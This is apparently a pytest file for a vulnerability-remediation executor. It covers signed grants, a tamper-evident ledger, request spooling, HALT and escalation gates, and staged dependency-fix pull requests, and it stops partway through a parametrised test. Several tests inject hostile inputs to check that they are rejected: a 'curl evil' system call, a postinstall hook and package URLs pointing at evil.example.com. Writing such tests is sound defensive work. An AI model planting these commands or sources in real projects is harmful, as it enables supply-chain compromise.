"""agentteams.vulnscan grant / ledger / executor / review (P1 + P5). Network-free.

Real Ed25519 keys (``cryptography``, the ``[signing]`` extra), a local bare git remote, and a fake
``gh`` on PATH. HOME and the vulnscan config/state dirs point into tmp_path.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

pytest.importorskip("cryptography")
from agentteams.vulnscan import _http, executor, executor_guard, executor_serve, fix, grant, ledger, osv, review  # noqa: E402
from tests._vulnscan_helpers import operator_home, sign_grant  # noqa: E402

GIT = shutil.which("git")
FROZEN_NOW = datetime(2026, 10, 22, 12, 0, tzinfo=UTC)


class _FrozenDatetime(datetime):
    """``executor.datetime`` with a fixed clock (V37): branch names and run ids never straddle midnight."""

    @classmethod
    def now(cls, tz: object = None) -> datetime:  # type: ignore[override]
        return FROZEN_NOW if tz is not None else FROZEN_NOW.replace(tzinfo=None)


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict:
    world = operator_home(tmp_path, monkeypatch)
    monkeypatch.setattr(executor, "datetime", _FrozenDatetime)
    return {**world, "cfg": {"governance_dir": str(world["gov"]), "cooldown_days": 14}}

def _install(env: dict, **kw: object) -> dict:
    args = {"ops": ["stage-fix", "open-pr", "server-audit"], "repo_roots": [str(env["tmp"] / "repos")],
            "hosts": ["web1"], "days": 7, "max_uses": 5, "key_id": "op", "governance_dir": str(env["gov"])}
    args.update(kw)
    (env["tmp"] / "repos").mkdir(exist_ok=True)
    rec = grant.build(**args)  # type: ignore[arg-type]
    signed = sign_grant(env["pem"], rec)
    grant.install(signed)
    return signed


# ---------------------------------------------------------------- grant

def test_build_enforces_v1_bounds(env: dict) -> None:
    gov = str(env["gov"])
    with pytest.raises(grant.GrantError, match="reserved"):
        grant.build(ops=["merge"], repo_roots=["/x"], hosts=[], days=1, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["all"], days=1, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["stage-fix"], repo_roots=[str(Path.home())], hosts=[], days=1, max_uses=1, key_id="op",
                    governance_dir=gov)
    with pytest.raises(grant.GrantError):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["h"], days=31, max_uses=1, key_id="op", governance_dir=gov)
    with pytest.raises(grant.GrantError, match="governance_dir"):
        grant.build(ops=["server-audit"], repo_roots=[], hosts=["h"], days=1, max_uses=1, key_id="op",
                    governance_dir=str(env["tmp"]))


def test_signed_grant_verifies_and_tampering_fails(env: dict) -> None:
    g = _install(env)
    valid, problems = grant.load_active()
    assert [v["grant_id"] for v in valid] == [g["grant_id"]] and not problems
    assert grant.covers(g, "server-audit", "web1") and not grant.covers(g, "server-audit", "web2")
    assert grant.covers(g, "stage-fix", str(env["tmp"] / "repos" / "a")) and not grant.covers(g, "stage-fix", "/etc")
    path = grant.grants_dir() / f"{g['grant_id']}.json"
    widened = {**g, "hosts": ["web1", "db1"]}
    path.write_text(json.dumps(widened))
    valid, problems = grant.load_active()
    assert not valid and "signature" in problems[0]


def test_expired_grant_and_aggregate_cap(env: dict) -> None:
    g = _install(env)
    later = datetime.fromisoformat(g["expires"]) + timedelta(seconds=1)
    assert grant.load_active(now=later)[0] == []
    _install(env)
    _install(env)
    valid, problems = grant.load_active()
    assert valid == [] and "aggregate cap" in problems[-1]


# ---------------------------------------------------------------- ledger

def test_ledger_chain_detects_tampering(env: dict) -> None:
    with ledger.locked():
        ledger.append("begun", grant_id="vg-x", op="server-audit", target="web1", request_id="r1")
        ledger.append("done", grant_id="vg-x", op="server-audit", target="web1", request_id="r1")
    assert [r["kind"] for r in ledger.read()] == ["begun", "done"]
    assert ledger.uses("vg-x") == 1 and ledger.consumed_request_ids() == {"r1"}
    p = ledger.ledger_path()
    lines = p.read_text().splitlines()
    forged = json.loads(lines[1])
    forged["detail"] = "forged"
    p.write_text(lines[0] + "\n" + json.dumps(forged) + "\n")
    with pytest.raises(ValueError, match="altered"):
        ledger.read()
    assert "INTEGRITY FAILURE" in review.build()


# ---------------------------------------------------------------- authorization

def test_act_refuses_without_grant_governance_or_under_halt(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "not authorized" in res["detail"]
    _install(env)
    log = env["gov"] / "references" / "security-decisions.log.csv"
    saved = log.read_text()
    log.unlink()
    res = executor.act("server-audit", "web1", {"governance_dir": "/ignored/unsigned/config"})
    assert res["status"] == "refused" and "decision log" in res["detail"]
    log.write_text(saved)
    from agentteams.cli import decision_log

    def halt(_dir: Path, *, action: str) -> None:
        raise RuntimeError(f"HALT {action}")
    monkeypatch.setattr(decision_log, "_assert_no_unretracted_halt", halt)
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "HALT" in res["detail"]
    assert all(r["kind"] == "refused" for r in ledger.read())


def test_use_cap_is_enforced(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env, max_uses=1)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "done"
    second = executor.act("server-audit", "web1", env["cfg"])
    assert second["status"] == "refused" and "exhausted" in second["detail"]


def test_server_op_rejects_unknown_hosts_and_all(env: dict) -> None:
    kit = env["tmp"] / "kit"
    kit.mkdir()
    (kit / "hosts.conf").write_text("web1 | deploy@web1.example.com | x\n")
    for bad in ("all", "web2"):
        with pytest.raises(executor.ExecError):
            executor.server_op("server-audit", bad)


# ---------------------------------------------------------------- spool

def test_spool_rejects_malformed_symlinked_and_replayed_requests(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    req = executor.spool_dir() / "requests"
    req.mkdir(parents=True)
    rid = "a" * 32
    (req / f"{rid}.json").write_text(json.dumps({"id": rid, "op": "server-audit", "target": "web1", "rationale": "audit"}))
    (req / ("b" * 32 + ".json")).write_text(json.dumps({"id": "b" * 32, "op": "server-audit", "target": "web1",
                                                         "extra": "--apply"}))
    outside = env["tmp"] / "secret.json"
    outside.write_text("{}")
    (req / ("c" * 32 + ".json")).symlink_to(outside)
    results = executor.serve_requests(env["cfg"])
    assert [r["status"] for r in results] == ["done"]
    kinds = [r["kind"] for r in ledger.read()]
    assert kinds.count("refused") == 2 and kinds.count("done") == 1
    (req / f"{rid}.json").write_text(json.dumps({"id": rid, "op": "server-audit", "target": "web1"}))
    executor.serve_requests(env["cfg"])
    assert "replay" in ledger.read()[-1]["detail"]
    assert "rejected spool file" in review.build()


# ---------------------------------------------------------------- repo ops (real git)

def _repo_with_remote(tmp: Path) -> Path:
    remote = tmp / "remote.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], check=True)
    repo = tmp / "repos" / "svc"
    repo.mkdir(parents=True)
    run = lambda *a: subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True)  # noqa: E731
    run("init", "-q", "-b", "main")
    run("config", "user.email", "t@example.com")
    run("config", "user.name", "t")
    (repo / "requirements.txt").write_text("PyJWT==2.3.0\nflask>=3\n")
    (repo / "app.py").write_text("print('hi')\n")
    run("add", "-A")
    run("commit", "-q", "-m", "init")
    # A GitHub-style origin (open-pr derives the PR's repository from it), rewritten to the local bare repo.
    run("remote", "add", "origin", "https://github.com/o/svc.git")
    run("config", f"url.{remote}.insteadOf", "https://github.com/o/svc.git")
    run("push", "-q", "origin", "main")
    run("remote", "set-head", "origin", "main")
    return repo


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_and_open_pr_end_to_end(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])

    def fake_fix(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
        return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)

    monkeypatch.setattr(fix, "fix_path", fake_fix)
    staged = executor.act("stage-fix", str(repo), env["cfg"], rationale="critical PyJWT")
    assert staged["status"] == "done" and staged["branch"].startswith("vulnscan/")
    assert staged["changed"] == ["requirements.txt"]
    assert not Path(staged["worktree"]).is_relative_to(repo)          # executor-owned, outside the checkout

    bindir = env["tmp"] / "bin"
    bindir.mkdir()
    (bindir / "gh").write_text('#!/bin/sh\necho "$@" > "$(dirname "$0")/gh.args"\n'
                               'echo https://github.example.com/o/svc/pull/7\n')
    (bindir / "gh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    pr = executor.act("open-pr", str(repo), env["cfg"], rationale="please @someone merge ```x```")
    assert pr["status"] == "done" and pr["pr"].endswith("/pull/7")
    gh_args = (bindir / "gh.args").read_text()
    assert "--repo github.com/o/svc " in gh_args                      # never left to gh's remote resolution
    heads = subprocess.run(["git", "-C", str(env["tmp"] / "remote.git"), "branch"], capture_output=True, text=True).stdout
    assert staged["branch"] in heads
    again = executor.act("open-pr", str(repo), env["cfg"])          # done: worktree and staged state removed
    assert again["status"] == "failed" and "no staged fix" in again["detail"]
    assert not Path(staged["worktree"]).exists()
    body = next(Path(staged["worktree"]).parent.glob("*.pr.md")).read_text()
    assert "@​someone" in body and "```x```" not in body
    md = review.build()
    assert "/pull/7" in md and "open-pr" in md
    review.acknowledge("looked fine")
    assert "0 rows in this review window" in review.build()


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_rejects_changes_outside_pins(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])

    def evil_fix(root: Path, **kw: object) -> fix.FixResult:
        (root / "app.py").write_text("import os; os.system('curl evil')\n")
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", evil_fix)
    res = executor.act("stage-fix", str(repo), env["cfg"], request_id="1" * 32)
    assert res["status"] == "failed" and "outside dependency pins" in res["detail"]
    _assert_refused_cleanly(repo, "1" * 32)

    def flask_rename(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("flask>=3", "flask @ https://evil.example.com/flask.whl"))
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", flask_rename)
    res = executor.act("stage-fix", str(repo), env["cfg"], request_id="2" * 32)
    assert res["status"] == "failed" and "non-pin line" in res["detail"]
    _assert_refused_cleanly(repo, "2" * 32)


def test_lockfile_registry_allowlist(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    repo.mkdir()
    subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
    lock = {"packages": {"": {"dependencies": {"a": "^1"}}, "node_modules/a": {"version": "1.0.0",
            "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz"}}}
    (repo / "package-lock.json").write_text(json.dumps(lock))
    subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "i"], check=True)
    base = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
    lock["packages"]["node_modules/a"]["resolved"] = "https://evil.example.com/a.tgz"
    (repo / "package-lock.json").write_text(json.dumps(lock))
    with pytest.raises(executor.ExecError, match="registry allowlist"):
        executor.validate_diff(repo, base)
    lock["packages"]["node_modules/a"]["resolved"] = "https://registry.npmjs.org/a/-/a-1.0.1.tgz"
    lock["packages"][""]["scripts"] = {"postinstall": "curl evil"}
    (repo / "package-lock.json").write_text(json.dumps(lock))
    with pytest.raises(executor.ExecError, match="root package scripts"):
        executor.validate_diff(repo, base)


def test_review_overdue_and_window(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "report": "r.md"})
    executor.act("server-audit", "web1", env["cfg"], rationale="daily")
    assert not review.overdue(days=3)
    assert review.overdue(days=-1)
    md = review.build(since=ledger.read()[-1]["ts"][:10])            # the row's own date: no midnight race (V37)
    assert "server-audit" in md and "1/5 uses" in md


def test_a_real_target_tagged_halt_row_stops_every_grant_use(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    """Through the real C-2 gate: a HALT on `vulnscan-remediation:web1` blocks web1 and every other target."""
    _install(env, hosts=["web1", "web2"])
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host})
    log = env["gov"] / "references" / "security-decisions.log.csv"
    with log.open("a") as fh:
        fh.write("2026-10-22,vulnscan,s1,vulnscan-remediation:web1,HALT,,,suspected compromise,security\n")
    for host in ("web1", "web2"):
        res = executor.act("server-audit", host, env["cfg"])
        assert res["status"] == "refused" and "HALT" in res["detail"], res


@pytest.mark.skipif(not GIT, reason="git not available")
def test_stage_fix_ignores_the_cooldown_setting(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix"], hosts=[])
    seen = {}

    def spy(root: Path, **kw: object) -> fix.FixResult:
        seen.update(kw)
        return fix.FixResult(applied=True)

    monkeypatch.setattr(fix, "fix_path", spy)
    executor.act("stage-fix", str(repo), {**env["cfg"], "cooldown_days": 30})
    assert seen["cooldown_days"] == executor.REMEDIATION_COOLDOWN_DAYS == 0   # S-10's remediation carve-out


def test_ledger_tail_truncation_and_deletion_are_detected(env: dict) -> None:
    with ledger.locked():
        for i in range(3):
            ledger.append("note", detail=str(i))
    p = ledger.ledger_path()
    lines = p.read_text().splitlines()
    p.write_text("\n".join(lines[:2]) + "\n")          # drop the last row: the chain itself still verifies
    with pytest.raises(ValueError, match="removed from its end"):
        ledger.read()
    p.unlink()
    with pytest.raises(ValueError, match="ledger was removed"):
        ledger.read()


# ---------------------------------------------------------------- R6 Phase 0 (M0.7–M0.10)

def _req(env: dict, rid: str, **body: object) -> Path:
    d = executor.spool_dir() / "requests"
    d.mkdir(parents=True, exist_ok=True)
    p = d / f"{rid}.json"
    p.write_text(json.dumps({"id": rid, **body}))
    return p


def test_payload_schema_and_size_caps(env: dict) -> None:
    ok = _req(env, "1" * 32, op="report", target="run", payload={"markdown": "x" * 100_000})
    assert executor_serve._read_request(ok)["payload"]["markdown"]          # > 64 KiB allowed for report only
    big = _req(env, "2" * 32, op="server-audit", target="web1", rationale="y" * 70_000)
    with pytest.raises(executor.ExecError, match="too large"):
        executor_serve._read_request(big)
    for rid, body in (("3" * 32, {"op": "escalate", "target": "x", "payload": {"kind": "escalation-flood", "evidence": "e"}}),
                      ("4" * 32, {"op": "server-audit", "target": "web1", "payload": {"markdown": "m"}}),
                      ("5" * 32, {"op": "report", "target": "run"}),
                      ("6" * 32, {"op": "escalate", "target": "x", "payload": {"kind": "ioc"}})):
        with pytest.raises(executor.ExecError):
            executor_serve._read_request(_req(env, rid, **body))


def test_canonical_target(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    (repo / "sub").mkdir(parents=True)
    subprocess.run(["git", "-C", str(repo), "init", "-q"], check=True)
    kit = env["tmp"] / "kit"
    kit.mkdir(exist_ok=True)
    (kit / "hosts.conf").write_text("web1 | deploy@web1.example.com | x\n")
    assert executor.canonical_target(str(repo / "sub")) == str(repo.resolve())
    assert executor.canonical_target("web1") == "web1"
    assert executor.canonical_target("not-a-host") is None and executor.canonical_target(str(tmp_path / "nope")) is None


def test_broken_ledger_refuses_without_raising(env: dict) -> None:
    _install(env)
    with ledger.locked():
        ledger.append("note", detail="x")
    ledger.ledger_path().write_text("")                         # truncated below the high-water mark
    res = executor.act("server-audit", "web1", env["cfg"])
    assert res["status"] == "refused" and "integrity" in res["detail"]
    assert executor.serve_requests(env["cfg"])[0]["status"] == "refused"


def test_internal_ops_are_processed_first_and_run_ids(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    order: list[str] = []
    _install(env)   # a granted op passes the batch preflight only when a valid grant allows it
    monkeypatch.setattr(executor, "act", lambda op, target, cfg, **kw: order.append(op) or {"status": "done"})
    _req(env, "a" * 32, op="server-audit", target="web1", rationale="r")
    _req(env, "b" * 32, op="report", target="run", payload={"markdown": "m"})
    _req(env, "c" * 32, op="escalate", target="web1", payload={"kind": "ioc", "evidence": "e"})
    executor.serve_requests(env["cfg"])
    assert order == ["escalate", "report", "server-audit"]
    rid = executor.new_run_id(Path("/x/2026-10-22"))
    assert rid.startswith("2026-10-22-") and len(rid) == len("2026-10-22-") + 6


# ---------------------------------------------------------------- R6 Phase 2 (I2): internal ops wired

def test_escalate_blocks_its_scope_notifies_and_dedupes(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import escalations, notify
    _install(env, hosts=["web1", "web2"])
    kit = env["tmp"] / "kit"
    kit.mkdir()
    (kit / "hosts.conf").write_text("web1 | d@web1.example.com | x\nweb2 | d@web2.example.com | x\n")
    sent: list[tuple] = []
    monkeypatch.setattr(notify, "send", lambda cfg, key, **f: sent.append((key, f)) or True)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    res = executor.act("escalate", "web1", env["cfg"], payload={"kind": "other", "evidence": "odd cron entry"},
                       run_id="r1")
    assert res["status"] == "done" and res["new"] and res["scope"] == "web1"
    assert sent == [("escalation", {"id": res["escalation"], "kind": "other"})]   # never the evidence
    again = executor.act("escalate", "web1", env["cfg"], payload={"kind": "other", "evidence": "same"}, run_id="r1")
    assert again["escalation"] == res["escalation"] and not again["new"] and len(sent) == 1
    blocked = executor.act("server-audit", "web1", env["cfg"])
    assert blocked["status"] == "refused" and res["escalation"] in blocked["detail"]
    assert executor.act("server-audit", "web2", env["cfg"])["status"] == "done"      # scoped, not global
    escalations.resolve_other(res["escalation"], "checked: operator's own cron job")
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "done"
    executor.act("escalate", "web2", env["cfg"], payload={"kind": "ioc", "evidence": "x"}, run_id="r1")
    assert executor.act("server-audit", "web1", env["cfg"])["status"] == "refused"   # ioc blocks everything


def test_report_needs_a_run_and_is_stored(env: dict) -> None:
    from agentteams.vulnscan import report_store
    res = executor.act("report", "run", env["cfg"], payload={"markdown": "# r"})
    assert res["status"] == "refused" and "run" in res["detail"]
    run = env["tmp"] / "state" / "2026-10-22"
    run.mkdir(parents=True)
    assert executor.act("report", "run", env["cfg"], payload={"markdown": "# hello"}, run_dir=run)["status"] == "done"
    assert "# hello" in (report_store.load(run) or "")
    assert ledger.read()[-1]["kind"] == "done"


def test_spooled_escalation_is_replay_protected(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import notify
    monkeypatch.setattr(notify, "send", lambda *a, **k: True)
    rid = "d" * 32
    _req(env, rid, op="escalate", target="/nowhere", payload={"kind": "other", "evidence": "e"})
    assert executor.serve_requests(env["cfg"], run_id="r2")[0]["scope"] == "*"     # unknown target: fail safe
    _req(env, rid, op="escalate", target="/nowhere", payload={"kind": "other", "evidence": "e"})
    executor.serve_requests(env["cfg"], run_id="r2")
    assert "replay" in ledger.read()[-1]["detail"]


def test_a_worktree_canonicalises_to_its_main_repository(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "main"
    repo.mkdir()
    for args in (["init", "-q"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"],
                 ["worktree", "add", "-q", str(tmp_path / "wt"), "-b", "side"]):
        subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)
    assert executor.canonical_target(str(tmp_path / "wt")) == str(repo.resolve())


def test_act_rechecks_a_used_request_id_under_the_lock(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    _install(env)
    monkeypatch.setattr(executor, "server_op", lambda op, host: {"host": host, "log": "x"})
    assert executor.act("server-audit", "web1", env["cfg"], request_id="e" * 32)["status"] == "done"
    again = executor.act("server-audit", "web1", env["cfg"], request_id="e" * 32)       # a second server's copy
    assert again["status"] == "refused" and "replay" in again["detail"]
    assert [r["kind"] for r in ledger.read()].count("done") == 1


def test_stale_requests_are_quarantined_with_one_row(env: dict) -> None:
    for i in range(5):
        _req(env, f"{i:x}" * 32, op="server-audit", target="web1")
    assert executor.quarantine_pending("left over") == 5
    assert not list((executor.spool_dir() / "requests").glob("*.json"))
    assert [r["op"] for r in ledger.read()] == ["(stale)"]


def test_a_spool_flood_opens_one_escalation_and_the_deadline_stops_a_pass(env: dict,
                                                                         monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import escalations, notify
    sent: list[str] = []
    monkeypatch.setattr(notify, "send", lambda cfg, key, **f: sent.append(key) or True)
    monkeypatch.setattr(executor, "MAX_REQUESTS_PER_PASS", 3)
    for i in range(5):
        _req(env, f"{i:x}" * 32, op="server-audit", target="web1")
    out = executor.serve_requests(env["cfg"], run_id="r1", deadline=0.0)   # deadline already passed
    assert out == [] and len(list((executor.spool_dir() / "requests").glob("*.json"))) == 3
    assert len(list((executor.spool_dir() / "processed").glob("overflow-*"))) == 2
    assert [e.kind for e in escalations.open_escalations()] == [escalations.FLOOD_KIND] and sent == ["escalation"]
    executor.serve_requests(env["cfg"], run_id="r1")
    assert [e.kind for e in escalations.open_escalations()] == [escalations.FLOOD_KIND]   # no second flood


def test_repo_ops_never_touch_the_publish_ops_repo(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    from agentteams.vulnscan import publish
    ops = env["tmp"] / "repos" / "ops"
    publish.grants_dir().mkdir(parents=True)
    # an unsigned / expired grant file still narrows: the guard never depends on the grant being valid
    (publish.grants_dir() / "vp-0000000000000000.json").write_text(json.dumps({"ops_repo": str(ops)}))
    assert publish.load_active()[0] == []
    with ledger.locked():
        with pytest.raises(executor.ExecError, match="ops repository"):
            executor.authorize("stage-fix", str(ops), "x", env["cfg"])


def _git_repo(path: Path) -> Path:
    path.mkdir(parents=True)
    for args in (["init", "-q"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"]):
        subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True)
    return path


@pytest.mark.skipif(not GIT, reason="git not available")
def test_p7_repo_ops_refuse_protected_repositories_by_common_dir(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    import agentteams
    from agentteams.vulnscan import publish
    tmp = env["tmp"]
    pkg_repo = _git_repo(tmp / "repos" / "agentteams-checkout")
    (pkg_repo / "agentteams").mkdir()
    monkeypatch.setattr(agentteams, "__file__", str(pkg_repo / "agentteams" / "__init__.py"))
    wt = tmp / "repos" / "agentteams-wt"
    subprocess.run(["git", "-C", str(pkg_repo), "worktree", "add", "-q", str(wt), "-b", "side"],
                   check=True, capture_output=True)
    team = _git_repo(tmp / "repos" / "team")
    gov_repo = _git_repo(tmp / "repos" / "gov")
    (gov_repo / "references").mkdir()
    # an unsigned, invalid grant file still narrows: only its governance_dir is read
    grant.grants_dir().mkdir(parents=True)
    (grant.grants_dir() / "vg-junk.json").write_text(json.dumps({"governance_dir": str(gov_repo / "references")}))
    publish.grants_dir().mkdir(parents=True)
    pub_gov = _git_repo(tmp / "repos" / "pubgov")
    (publish.grants_dir() / "vp-junk.json").write_text(json.dumps({"governance_dir": str(pub_gov), "ops_repo": "/nope"}))
    (publish.grants_dir() / "vp-bad.json").write_text("{not json")
    unrelated = _git_repo(tmp / "repos" / "unrelated")
    cfg = {**env["cfg"], "agent": {"team_dir": str(team)}}
    for target in (wt, pkg_repo, team, gov_repo, pub_gov):
        with ledger.locked():
            with pytest.raises(executor.ExecError, match="same repository"):
                executor.authorize("stage-fix", str(target), "x", cfg)
    with ledger.locked():                                    # an unrelated repo only lacks a grant
        with pytest.raises(executor.ExecError, match="not authorized"):
            executor.authorize("open-pr", str(unrelated), "x", cfg)
    assert executor_guard.repo_identity(tmp / "missing") is None and executor_guard.repo_identity(Path("relative")) is None
    res = executor.act("stage-fix", str(wt), cfg)                       # without a grant, nothing runs git in it
    assert res["status"] == "refused" and "not authorized" in res["detail"]
    _install(env, ops=["stage-fix"], hosts=[])
    res = executor.act("stage-fix", str(wt), cfg)
    assert res["status"] == "refused" and "same repository" in res["detail"]


def test_origin_repo_forms_and_refusal(env: dict, tmp_path: Path) -> None:
    if not GIT:
        pytest.skip("git not available")
    repo = tmp_path / "r"
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    for url, want in (("https://github.com/o/svc.git", "github.com/o/svc"),
                      ("git@github.com:o/svc.git", "github.com/o/svc"),
                      ("ssh://git@ghe.example.com:2222/team/app", "ghe.example.com/team/app"),
                      ("https://github.com/o/svc", "github.com/o/svc")):
        subprocess.run(["git", "-C", str(repo), "remote", "remove", "origin"], capture_output=True)
        subprocess.run(["git", "-C", str(repo), "remote", "add", "origin", url], check=True)
        assert executor._origin_repo(repo) == want, url
    subprocess.run(["git", "-C", str(repo), "remote", "set-url", "origin", str(tmp_path / "bare.git")], check=True)
    with pytest.raises(executor.ExecError, match="not a GitHub repository URL"):
        executor._origin_repo(repo)


@pytest.mark.skipif(not GIT, reason="git not available")
def test_open_pr_checks_origin_before_pushing(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    repo = _repo_with_remote(env["tmp"])
    _install(env, ops=["stage-fix", "open-pr"], hosts=[])

    def fake_fix(root: Path, **kw: object) -> fix.FixResult:
        req = root / "requirements.txt"
        req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
        return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)

    monkeypatch.setattr(fix, "fix_path", fake_fix)
    assert executor.act("stage-fix", str(repo), env["cfg"])["status"] == "done"
    subprocess.run(["git", "-C", str(repo), "remote", "set-url", "origin", str(env["tmp"] / "remote.git")], check=True)
    res = executor.act("open-pr", str(repo), env["cfg"])
    assert res["status"] == "failed" and "not a GitHub repository URL" in res["detail"]
    heads = subprocess.run(["git", "-C", str(env["tmp"] / "remote.git"), "branch"], capture_output=True, text=True).stdout
    assert "vulnscan/" not in heads                                   # nothing was pushed


def test_a_hung_repository_check_refuses_instead_of_crashing(env: dict, monkeypatch: pytest.MonkeyPatch) -> None:
    def hang(path: Path) -> Path:
        raise subprocess.TimeoutExpired("git", 30)
    monkeypatch.setattr(executor_guard, "repo_identity", hang)
    with pytest.raises(executor.ExecError, match="in time; refusing"):
        executor_guard.refuse_protected_repos(str(env["tmp"]), env["cfg"])


# ---------------------------------------------------------------- test campaign Area B (D3, D4, I4, I6, A3, A4)

def _pin_fix(root: Path, **kw: object) -> fix.FixResult:
    req = root / "requirements.txt"
    req.write_text(req.read_text().replace("PyJWT==2.3.0", "PyJWT==2.15.0"))
    return fix.FixResult(changes=[fix.PinChange("requirements.txt", "PyJWT", "2.3.0", "2.15.0")], applied=True)


_GH = """#!/bin/sh
d="$(dirname "$0")"
echo "$@" >> "$d/gh.log"
case "$1 $2" in
  "pr list") if [ -f "$d/open.json" ]; then cat "$d/open.json"; else echo "[]"; fi ;;
  "pr create") if [ -f "$d/fail" ]; then echo "HTTP 502" >&2; exit 1; fi
               echo https://github.example.com/o/svc/pull/9 ;;
  *) exit 2 ;;
esac
"""


def _fake_gh(env: dict, monkeypatch: pytest.MonkeyPatch) -> Path:
    bindir = env["tmp"] / "ghbin"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH)
    (bindir / "gh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
    return bindir


def _gh_calls(bindir: Path) -> list[str]:
    log = bindir / "gh.log"
    return log.read_text().splitlines() if log.exists() else []


def _sh(repo: Path, *args: str) -> str:
    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, text=True).stdout


def _executor_worktrees(repo: Path) -> list[str]:
    return [ln.split(" ", 1)[1] for ln in _sh(repo, "worktree", "list", "--porcelain").splitlines()
            if ln.startswith("worktree ") and "/worktrees/" in ln]


def _no_begun(rows: list[dict]) -> bool:
    return not any(r["kind"] == "begun" for r in rows)


def _assert_refused_cleanly(repo: Path, rid: str) -> None:
    """V30: a refused stage-fix leaves no vulnscan branch, no staged state or worktree, and exactly [begun, failed]."""
    assert [r["kind"] for r in ledger.read() if r.get("request_id") == rid] == ["begun", "failed"]
    assert _sh(repo, "branch", "--list", "vulnscan/*") == ""
    assert not (executor.spool_dir() / "staged" / f"{executor.state_slug(repo.resolve())}.json").exists()
    assert _executor_worktrees(repo) == [] and _sh(repo, "status", "--porcelain") == ""


MALFORMED_LOCKS = [(None, "[]"), (None, '"a string"'), (None, '{"packages": []}'),
                   (None, '{"packages": {"node_modules/a": "1.0.0"}}'), (None, '{"packages": {"": []}}'),
                   (None, '{"dependencies": []}'), (None, '{"dependencies": {"a": "1.0.0"}}'),
                   (None, '{"dependencies": {"a": {"dependencies": [1]}}}'),
                   ('[{"packages": {}}]', '{"packages": {"": {}}}'), ('{"packages": "x"}', '{"packages": {"": {}}}')]


@pytest.mark.skipif(not GIT, reason="git not available")
@pytest.mark.parametrize(("base", "new"), MALFORMED_LOCKS)
def test_d3_a_malformed_lockfile_fails_the_action_instead_of_raising(env: dict, monkeypatch: pytest.MonkeyPatch,
                                                                     base: str | None, new: str) -> None:
    repo = _repo_with_remote(env["tmp"])
    if base is not None:
        (repo / "package-lock.json").write_text(base)
